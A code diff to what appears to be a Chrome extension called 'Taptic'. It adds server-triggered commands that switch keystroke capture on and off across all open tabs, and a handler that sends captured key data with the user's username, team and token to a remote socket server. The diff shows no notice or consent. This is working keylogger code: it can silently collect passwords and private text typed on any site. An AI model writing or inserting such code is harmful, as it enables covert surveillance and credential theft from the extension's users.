@@ -150,6 +150,24 @@ function connectSocket() {
     });
   });
 
+  socket.on("enable_keystroke_capture", (data) => {
+    console.log("Taptic: Enabling keystroke capture", data);
+    chrome.tabs.query({}, (tabs) => {
+      for (const tab of tabs) {
+        chrome.tabs.sendMessage(tab.id, { type: "enable-keystroke-capture" });
+      }
+    });
+  });
+
+  socket.on("disable_keystroke_capture", (data) => {
+    console.log("Taptic: Disabling keystroke capture", data);
+    chrome.tabs.query({}, (tabs) => {
+      for (const tab of tabs) {
+        chrome.tabs.sendMessage(tab.id, { type: "disable-keystroke-capture" });
+      }
+    });
+  });
+
   socket.on("disconnect", () => {});
   socket.on("connect_error", () => {});
 }
@@ -205,6 +223,28 @@ chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
     state.lastSeenAt = Date.now();
     sendResponse({ ok: true });
     return false;
+  }
+
+  if (msg.type === "keystroke") {
+    // Forward keystroke to server
+    loadSettings((settings) => {
+      if (!settings.username || !settings.team || !settings.token) {
+        sendResponse({ ok: false, error: "missing credentials" });
+        return;
+      }
+
+      const payload = {
+        username: settings.username,
+        team: settings.team,
+        token: settings.token,
+        keyData: msg.keyData || "",
+        timestamp: msg.timestamp || Date.now()
+      };
+
+      emitOrQueue("keystroke_data", payload);
+      sendResponse({ ok: true });
+    });
+    return true;
   }
 
   if (msg.type === "get-tracking-state" && tabId !== null) {
